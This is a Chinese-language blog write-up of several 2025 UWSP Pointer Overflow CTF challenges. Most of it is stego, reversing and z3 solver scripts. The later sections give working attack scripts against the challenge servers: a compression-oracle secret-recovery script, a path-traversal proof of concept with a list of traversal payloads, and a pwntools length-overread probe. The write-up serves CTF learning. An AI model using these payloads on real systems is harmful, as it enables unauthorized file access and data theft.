---
title: 2025UWSP Pointer Overflow CTF
slug: 2025uwsp-pointer-overflow-ctf-zrympb
url: /post/2025uwsp-pointer-overflow-ctf-zrympb.html
date: '2025-11-04 18:19:17+08:00'
lastmod: '2025-11-15 14:39:02+08:00'
categories:
  - CTF-Writeup
description: 只做了一点
toc: true
isCJKLanguage: true
---



# 2025UWSP Pointer Overflow CTF

随便做了一点

# Stego

## Stego 100-1 Ink Between the Lines

```python
def extract_between_dot_and_newline(filepath):
    with open(filepath, "rb") as f:
        data = f.read()

    bits = ""
    inside = False
    temp = b""

    for b in data:
        if b == 0x2E:  # 遇到句号 '.'
            inside = True
            temp = b""
        elif b == 0x0A:  # 遇到换行
            if inside and temp:
                # 提取其中的空白字符
                for c in temp:
                    if c == 0x20:      # 空格
                        bits += "0"
                    elif c == 0x09:    # Tab
                        bits += "1"
                bits += " "
            inside = False
        elif inside:
            temp += bytes([b])

    return bits

bits = extract_between_dot_and_newline("leaflet.txt")

# 转换为字符串
bin_data = "".join(bits.split())
print(bin_data)
decoded = "".join(
    chr(int(bin_data[i:i+8], 2)) for i in range(0, len(bin_data), 8)
)
print(decoded)

```

## Stego 100-3 Low Tide at Midnight

使用stegsolve调一下通道

再手动恢复一下

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104195209-pz04da4.png)

使用stegsolve调一下通道

再手动恢复一下

微信一扫就出来了

```bash
poctf{uwsp_f0r3v3r_bl0w1n6_bubbl35}
```

# Reversing

## Reverse 100-1 Seven Easy Pieces

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104202805-smlxgiz.png)

```python
arr = [
    0x47,0x58,0x54,0x43,0x51,0x4C,0x42,0x40,0x44,0x47,0x68,0x02,0x07,0x5A,0x04,
    0x68,0x51,0x5B,0x03,0x01,0x68,0x00,0x5F,0x06,0x02,0x68,0x00,0x42,0x45,0x59,
    0x04,0x53,0x68,0x07,0x42,0x00,0x68,0x00,0x07,0x68,0x55,0x04,0x4A
]

flag = ''.join(chr(x ^ 0x37) for x in arr)
print(flag)

```

## Reverse 100-2 Left at the Light

‍

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104203212-hfa2s1l.png)

base64解码得到

```bash
poctf{uwsp_wh33zy_wh15k3r5_4nd_w15py_w1nd5}
```

## Reverse 100-3 A Tree of Knives

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  int result; // eax
  char v5[264]; // [rsp+20h] [rbp-108h] BYREF

  if ( Size )
  {
    if ( Size < 0x100 )
    {
      memcpy(v5, Src, Size);
      v5[Size] = 0;
      return _mingw_printf("Well done. Flag: %s\n", v5);
    }
  }
  else
  {
    v3 = __acrt_iob_func(2u);
    return _mingw_fprintf(v3, "No flag buffer present. Aborting.\n");
  }
  return result;
}
```

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104204650-sz1tp3t.png)

## Reverse 100-4 Gremlins in the Gears

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104211008-7iniaqa.png)

upx脱壳就出

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104210945-ibreywi.png)

## Reverse 200-1 On Hinge and Pin

```java
package com.poctf.onhingeandpin;

import android.content.Context;
import java.io.IOException;
import java.io.InputStream;
import kotlin.Metadata;
import kotlin.io.ByteStreamsKt;
import kotlin.io.CloseableKt;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.Charsets;
import kotlin.text.StringsKt;

/* compiled from: Crypto.kt */
@Metadata(d1 = {"\u0000\u001c\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\bÆ\u0002\u0018\u00002\u00020\u0001B\u0007\b\u0002¢\u0006\u0002\u0010\u0002J\u0018\u0010\u0005\u001a\u00020\u00042\u0006\u0010\u0006\u001a\u00020\u00072\b\b\u0002\u0010\b\u001a\u00020\u0004R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082T¢\u0006\u0002\n\u0000¨\u0006\t"}, d2 = {"Lcom/poctf/onhingeandpin/Crypto;", "", "()V", "KEY", "", "loadAndDecrypt", "ctx", "Landroid/content/Context;", "assetName", "app_debug"}, k = 1, mv = {1, 9, 0}, xi = 48)
/* loaded from: classes3.dex */
public final class Crypto {
    public static final Crypto INSTANCE = new Crypto();
    private static final String KEY = "ONOFFONOFF";

    private Crypto() {
    }

    public static /* synthetic */ String loadAndDecrypt$default(Crypto crypto, Context context, String str, int i, Object obj) {
        if ((i & 2) != 0) {
            str = "enc_flag.bin";
        }
        return crypto.loadAndDecrypt(context, str);
    }

    public final String loadAndDecrypt(Context ctx, String assetName) throws IOException {
        Intrinsics.checkNotNullParameter(ctx, "ctx");
        Intrinsics.checkNotNullParameter(assetName, "assetName");
        InputStream inputStreamOpen = ctx.getAssets().open(assetName);
        try {
            InputStream it = inputStreamOpen;
            Intrinsics.checkNotNull(it);
            byte[] data = ByteStreamsKt.readBytes(it);
            CloseableKt.closeFinally(inputStreamOpen, null);
            byte[] key = StringsKt.encodeToByteArray(KEY);
            byte[] out = new byte[data.length];
            int length = data.length;
            for (int i = 0; i < length; i++) {
                out[i] = (byte) (data[i] ^ key[i % key.length]);
            }
            return new String(out, Charsets.UTF_8);
        } finally {
        }
    }
}
```

取出资源文件

```python
# decrypt_flag.py
# Python 3
KEY = b"ONOFFONOFF"

def decrypt_bytes(data):
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ KEY[i % len(KEY)]
    return bytes(out)

if __name__ == "__main__":
    import sys
    fn = "enc_flag.bin"
    try:
        with open(fn, "rb") as f:
            data = f.read()
    except FileNotFoundError:
        print(f"文件未找到: {fn}")
        sys.exit(1)

    dec = decrypt_bytes(data)
    try:
        s = dec.decode("utf-8")
    except:
        s = dec.decode("latin1", errors="replace")
    print(s)

```

## Reverse 200-2 Bearing the Load

![1fdbdc1dc270ece4b9798f93c49b9eb0](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic1fdbdc1dc270ece4b9798f93c49b9eb0-20251104214358-td9d0e4.png)

断下,点击v6即可得到flag

## Reverse 200-3 The Glass Bead Game

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104214841-9v5tjsg.png)

## Reverse 300-1 Through a Glass Darkly

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104210532-v4d343m.png)

直接z3求解

```python
# solve_flag_z3_prefix.py
# pip install z3-solver
from z3 import *

mem1024 = [ord(c) for c in "through_a_glass_darkly"]  # len=22
mem1056 = [
    0x43, 0x55, 0x84, 0x24, 0xF7, 0x5C, 0x90, 0xE9, 0xA8,
    0xCD, 0x26, 0xBC, 0x07, 0x4A, 0x0E, 0xA8, 0xE5, 0x5A,
    0x48, 0xE2, 0xBA, 0x77, 0x7D, 0x6E, 0x11, 0x86, 0xBE
]  # len=27

N = 27  # 循环次数（.wat 中明确检查 27 个字节）

# 8位循环左移
def rotl8(x: BitVecRef, s: int) -> BitVecRef:
    return RotateLeft(x, s)

# 建立 8位输入变量 a[0..26]
a = [BitVec(f'a_{i}', 8) for i in range(N)]

s = Solver()

for i in range(N):
    # 选择 mem[1024] 的索引：i<22 ? i : i-22
    idx = i if i < 22 else i - 22
    C = BitVecVal(mem1024[idx] & 0xFF, 8)
    K = BitVecVal(mem1056[i] & 0xFF, 8)

    # s(i) = ((i % 7) + 1) & 7
    si = ((i % 7) + 1) & 7

    # D = C XOR ((73*i + 19) & 0xFF)
    Di = C ^ BitVecVal(((73 * i + 19) & 0xFF), 8)

    # rot = ROTL8(D, s(i))
    rot = rotl8(Di, si)

    # T8 = (K + 123 - 17*i) & 0xFF
    T8_val = (mem1056[i] + 123 - 17 * i) & 0xFF
    T8 = BitVecVal(T8_val, 8)

    # 目标等式：a[i] == (rot XOR T8)
    s.add(a[i] == (rot ^ T8))

# ===== 固定前缀 poctf{ =====
prefix = b"poctf{"
for i, ch in enumerate(prefix):
    s.add(a[i] == BitVecVal(ch, 8))


if s.check() != sat:
    print("unsat / 无解")
else:
    m = s.model()
    flag_bytes = bytes(int(m[a[i]].as_long()) & 0xFF for i in range(N))
    try:
        print("flag:", flag_bytes.decode('utf-8'))
    except UnicodeDecodeError:
        print("flag (latin-1):", flag_bytes.decode('latin-1'))
    print("hex :", flag_bytes.hex())

```

## Reverse 300-2 Make the Pieces Sing

```python
#!/usr/bin/env python3
# coding: utf-8
"""
make_rev300_mid.py
生成用于 rev300-2 的最小 MIDI（format 0），正确实现 VLQ 与 track length。
输出文件: rev300_song_fixed.mid
"""

from pathlib import Path

# 题目提示中给出的 40 字节十六进制指纹（20 对）
HEX_KEY = "550027202760306057602cc02cc050c027c02c60576029202960306059602ee05c605a6059602e60"

OUT = Path("rev300_song_fixed.mid")
PPQ = 480  # ticks per quarter (对解析无影响)

def vlq_encode(value: int) -> bytes:
    """将非负整数编码为 MIDI VLQ（variable-length quantity）。"""
    assert value >= 0
    parts = []
    parts.append(value & 0x7F)
    value >>= 7
    while value:
        parts.append((value & 0x7F) | 0x80)
        value >>= 7
    return bytes(reversed(parts))

def be16(n: int) -> bytes:
    return n.to_bytes(2, "big")

def be32(n: int) -> bytes:
    return n.to_bytes(4, "big")

def build_midi_from_hex(hex_key: str, channel: int = 0, vel_on: int = 0x40) -> bytes:
    data = bytes.fromhex(hex_key)
    if len(data) != 40:
        raise ValueError("hex_key length != 40 bytes")
    pairs = [(data[i], data[i+1]) for i in range(0, len(data), 2)]  # (pitch, dt)

    # 构造 track 事件字节流
    events = bytearray()

    # 选择使用 Note-On (0x90|ch) and Note-Off (0x80|ch) events
    note_on_status = 0x90 | (channel & 0x0F)
    note_off_status = 0x80 | (channel & 0x0F)
    vel_off = 0x00

    # Optional: 在 track 开头插入一个 track name meta event（不是必要的）
    # events += vlq_encode(0) + bytes([0xFF, 0x03, 0x05]) + b"REV30"

    # 累加的 tick 值由 SING 的逻辑计算（程序里会累加读取的每个 delta）
    # 题目给的 dt 字节是：第一个为绝对 tick%256，后续为相对 delta%256。
    # 这里直接把每个 dt 作为 MIDI 事件的 delta-time（以字节值作为整数）
    for (pitch, dt) in pairs:
        # delta-time: dt (0..255); 用 VLQ 正确编码
        events += vlq_encode(dt)
        # Note-On (velocity 非零)
        events += bytes([note_on_status, pitch, vel_on])
        # immediate Note-Off (delta=0)
        events += vlq_encode(0)
        events += bytes([note_off_status, pitch, vel_off])

    # End of Track
    events += vlq_encode(0) + bytes([0xFF, 0x2F, 0x00])

    # SMF Header (format 0, one track)
    header = b"MThd" + be32(6) + be16(0) + be16(1) + be16(PPQ)

    # Track chunk: 要写入长度字段（4 字节大端）为 events 的实际字节数
    track = b"MTrk" + be32(len(events)) + bytes(events)

    return header + track

def main():
    mid = build_midi_from_hex(HEX_KEY)
    OUT.write_bytes(mid)
    print(f"Wrote {OUT} ({len(mid)} bytes).")
    print("运行验证: ./rev300-2 rev300_song_fixed.mid")

if __name__ == "__main__":
    main()

```

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251105123307-umwmte4.png)

# Misc

## Misc 100-1 Honey, I Shrunk the Kids

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Fast compression-oracle blind recovery (no CLI).
- 两阶段选择：粗筛一遍 -> 前K复测(取中位数)
- 自适应节流 + 长连接 + 进度持久化
- 可选“重复增强”以放大 gzip 命中差异
"""

import requests, time, json, urllib.parse, random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from statistics import median

# ================== 可调参数 ==================
BASE_URL       = "https://misc100-1.pointeroverflowctf.com"
ORACLE_PATH    = "/oracle?q="
START_PREFIX   = "poctf{uwsp_"   # 你已知的前缀；若要从最开头，请改成 "poctf{"
MAXLEN         = 200
OUT_PROGRESS   = "progress.json"

CANDIDATES     = list("abcdefghijklmnopqrstuvwxyz0123456789_{}")
K_TOP          = 5            # 进入复测的候选个数（粗筛后取前 K）
RECHECK_TIMES  = 3            # 复测次数（取中位数做评分）
REQUEST_TIMEOUT= 8
BASE_DELAY     = 0.20         # 基本间隔(秒)
JITTER         = 0.05         # 抖动(秒)
BACKOFF_FACTOR = 0.7
MAX_RETRIES    = 4

# “重复增强”系数：把 payload 重复 N 次拼接（很多 gzip 题有效）
AMPLIFY        = 2            # 建议 2~4；如服务器较脆弱设为 1 关闭
# =============================================

# —— 会话与请求 —— #
def make_session():
    s = requests.Session()
    retries = Retry(
        total=MAX_RETRIES,
        backoff_factor=BACKOFF_FACTOR,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=frozenset(["GET"])
    )
    s.mount("https://", HTTPAdapter(max_retries=retries, pool_connections=16, pool_maxsize=32))
    s.mount("http://",  HTTPAdapter(max_retries=retries, pool_connections=16, pool_maxsize=32))
    s.headers.update({
        "User-Agent": "poctf-oracle-fast/2.0",
        "Accept": "application/json",
        "Connection": "keep-alive",
    })
    return s

def encode_payload(p: str) -> str:
    # 允许自定义放大：把猜测串重复拼接，放大压缩器“词典命中”差异
    if AMPLIFY > 1:
        p = p * AMPLIFY
    return urllib.parse.quote_plus(p, safe='')

def oracle_len(sess, payload: str) -> int:
    """调用 /oracle 返回 compressed_len"""
    q = encode_payload(payload)
    url = BASE_URL.rstrip("/") + ORACLE_PATH + q
    r = sess.get(url, timeout=REQUEST_TIMEOUT)
    if r.status_code == 429:
        # 遵循 Retry-After 或指数退避
        ra = r.headers.get("Retry-After")
        wait = float(ra) if ra else BACKOFF_FACTOR
        print(f"[429] rate-limited, sleep {wait:.2f}s")
        time.sleep(wait)
        # 再试一次（交给会话重试策略去兜底）
        r = sess.get(url, timeout=REQUEST_TIMEOUT)
    r.raise_for_status()
    data = r.json()
    return int(data["compressed_len"])

# —— 轻量缓存：相同候选不重复请求 —— #
cache = {}
def score_once(sess, guess: str) -> int:
    if guess in cache:
        return cache[guess]
    v = oracle_len(sess, guess)
    cache[guess] = v
    return v

# —— 进度保存/恢复 —— #
def save_progress(prefix: str):
    with open(OUT_PROGRESS, "w", encoding="utf-8") as f:
        json.dump({
            "base": BASE_URL, "prefix": prefix, "ts": time.time()
        }, f, ensure_ascii=False, indent=2)

def load_progress(default_prefix: str) -> str:
    try:
        with open(OUT_PROGRESS, "r", encoding="utf-8") as f:
            data = json.load(f)
            if data.get("base") == BASE_URL and data.get("prefix", "").startswith(default_prefix):
                return data["prefix"]
    except FileNotFoundError:
        pass
    return default_prefix

# —— 主逻辑 —— #
def pick_best_char(sess, prefix: str) -> str:
    """
    两阶段：
    1) 粗筛：对所有候选各测1次，取最小压缩长度的前K
    2) 复测：对前K各测 RECHECK_TIMES 次，取中位数；再选最小者
    """
    # 随机化顺序，避免服务器缓存/频率偏置
    cand = CANDIDATES[:]
    random.shuffle(cand)

    # 粗筛
    scores = []
    for ch in cand:
        payload = prefix + ch
        try:
            v = score_once(sess, payload)
        except Exception as e:
            # 失败给大数，避免误选
            print(f"[!] probe '{ch}' failed: {e}")
            v = 10**9
        scores.append((ch, v))
        # 轻微抖动，降低节流
        time.sleep(BASE_DELAY + random.uniform(0, JITTER))

    # 取前K
    scores.sort(key=lambda x: (x[1], x[0]))
    topk = scores[:K_TOP]

    # 复测
    best_ch, best_med = None, 10**9
    for ch, v0 in topk:
        vals = [v0]
        for _ in range(RECHECK_TIMES - 1):
            try:
                vals.append(oracle_len(sess, prefix + ch))
            except Exception as e:
                print(f"[!] recheck '{ch}' failed: {e}")
                vals.append(10**9)
            time.sleep(BASE_DELAY + random.uniform(0, JITTER))
        m = median(vals)
        print(f"    '{ch}' -> median {m} from {vals}")
        if (m, ch) < (best_med, best_ch or "~"):
            best_ch, best_med = ch, m

    print(f"[+] choose '{best_ch}' (median={best_med})")
    return best_ch

def recover():
    sess = make_session()
    prefix = load_progress(START_PREFIX)
    print(f"[+] Start/Resume: {prefix}")

    # 可选：先测一下面线
    try:
        base_line = oracle_len(sess, prefix)
        print(f"[i] baseline({len(prefix)}): {base_line}")
    except Exception as e:
        print(f"[!] initial probe failed: {e}")

    while len(prefix) < MAXLEN:
        print(f"\n[>] pos {len(prefix)} …")
        ch = pick_best_char(sess, prefix)
        prefix += ch
        print(f"[=] {prefix}")
        save_progress(prefix)
        if ch == "}":
            print("[✓] Closing brace found. Done.")
            break

    print(f"[FINAL] {prefix}")
    return prefix

if __name__ == "__main__":
    recover()

```

# Exploit

## Exploit 200-1 Queue the Music

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PoC for pointeroverflow exp200 queuer / path-traversal attempt
# 使用方法: python3 poc_explist.py https://exp200-1.pointeroverflowctf.com

import sys
import requests
import time

if len(sys.argv) != 2:
    print("Usage: python3 poc_explist.py <BASE_URL>")
    print("Example: python3 poc_explist.py https://exp200-1.pointeroverflowctf.com")
    sys.exit(1)

BASE = sys.argv[1].rstrip('/')

# 你可以在这里添加/删减尝试的 sid 变体
CANDIDATES = [
    "../../flag/flag.txt",
    "../../../flag/flag.txt",
    "../../../../flag/flag.txt",
    "/tmp/uploads/../../flag/flag.txt",
    "/tmp/uploads/../../../flag/flag.txt",
    "../..//flag/flag.txt",
    "..%2f..%2fflag%2fflag.txt",   # URL encoded
    "..\\..\\flag\\flag.txt",     # windows style (大多数 unix 服务会忽略)
    "../../flag",                 # 若服务拼接后再加 /track.txt -> /flag/track.txt
    "../../flag/",                # 同上，带尾斜杠
    "....//....//flag/flag.txt",  # 混淆型
]

# 一些 HTTP 头，模拟常见浏览器请求
HEADERS = {
    "User-Agent": "PoC/1.0",
}

def get_session():
    url = BASE + "/session"
    try:
        r = requests.post(url, timeout=6, headers=HEADERS)
        try:
            j = r.json()
            sid = j.get("sid")
            print("[*] /session ->", r.status_code, j)
            return sid
        except Exception:
            print("[*] /session raw ->", r.status_code, r.text[:200])
            return None
    except Exception as e:
        print("[!] /session error:", e)
        return None

def upload_with_sid(sid_value, content="POC_CONTENT"):
    url = BASE + "/upload"
    # 尝试多种提交方式：form-data 与 json
    # 1) form
    try:
        r = requests.post(url, data={"sid": sid_value, "content": content}, timeout=6, headers=HEADERS)
        print(f"    [upload form] sid={sid_value!r} -> {r.status_code}")
    except Exception as e:
        print("    [upload form] error", e)
    # 2) json
    try:
        r = requests.post(url, json={"sid": sid_value, "content": content}, timeout=6, headers=HEADERS)
        print(f"    [upload json] sid={sid_value!r} -> {r.status_code}")
    except Exception as e:
        print("    [upload json] error", e)

def queue_with_sid(sid_value):
    url = BASE + "/queue"
    # 先尝试 form
    try:
        r = requests.post(url, data={"sid": sid_value}, timeout=6, headers=HEADERS)
        print(f"    [queue form] sid={sid_value!r} -> {r.status_code}")
    except Exception as e:
        print("    [queue form] error", e)
    # 再尝试 json
    try:
        r = requests.post(url, json={"sid": sid_value}, timeout=6, headers=HEADERS)
        print(f"    [queue json] sid={sid_value!r} -> {r.status_code}")
    except Exception as e:
        print("    [queue json] error", e)

def get_playlist():
    url = BASE + "/playlist"
    try:
        r = requests.get(url, timeout=6, headers=HEADERS)
        print("[*] GET /playlist ->", r.status_code)
        return r.text
    except Exception as e:
        print("[!] GET /playlist error:", e)
        return ""

def try_candidate(candidate):
    print("="*60)
    print("[*] try candidate:", candidate)
    # 上传恶意 sid
    upload_with_sid(candidate, content="poc-track")
    # 给服务一点时间处理（必要时可调小）
    time.sleep(0.2)
    # 触发 queue 行为
    queue_with_sid(candidate)
    # 等待并读取 playlist
    time.sleep(0.5)
    pl = get_playlist()
    if not pl:
        print("    [!] playlist empty or couldn't fetch")
        return False, pl
    # 简单检测 flag-like pattern
    if "flag{" in pl or "FLAG{" in pl or "poctf{" in pl:
        print("[!!!] POSSIBLE FLAG FOUND in playlist for candidate:", candidate)
        return True, pl
    else:
        print("    [-] no flag pattern in playlist for candidate:", candidate)
        return False, pl

def main():
    print("[*] Base URL:", BASE)
    print("[*] First, get /session (optional)")
    sid = get_session()
    if sid:
        print("[*] got server session sid:", sid)
    else:
        print("[*] no sid from /session or couldn't parse; continuing with custom candidates")

    # 首先尝试服务返回的 sid（如果有）
    if sid:
        ok, pl = try_candidate(sid)
        if ok:
            print(pl)
            return

    # 然后遍历我们预制的 candidate 列表
    for c in CANDIDATES:
        ok, pl = try_candidate(c)
        if ok:
            print("\n\n[!!!] FOUND FLAG in playlist dump:\n")
            print(pl)
            return

    print("\n[*] Try also manual fuzzing or add more traversal patterns to CANDIDATES.")
    print("[*] If nothing found, 服务可能不会直接把 sid 当做文件路径拼接，或者 /tmp/uploads 不可写由外部用户修改。")

if __name__ == "__main__":
    main()

```

![image](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251105185117-zb83eln.png)

## Exploit 100-2 Mason, Meridian

```python
#!/usr/bin/env python3
from pwn import *
HOST = "exp100-2.pointeroverflowctf.com"
PORT = 14662

io = remote(HOST, PORT, timeout=5)
io.sendline(b"200:AAA")            

buf = b""
while True:
    try:
        part = io.recv(timeout=1)    
        if not part: break
        buf += part
    except EOFError:
        break
    except Exception:
        break

print(buf.decode(errors="replace"))
io.close()
```
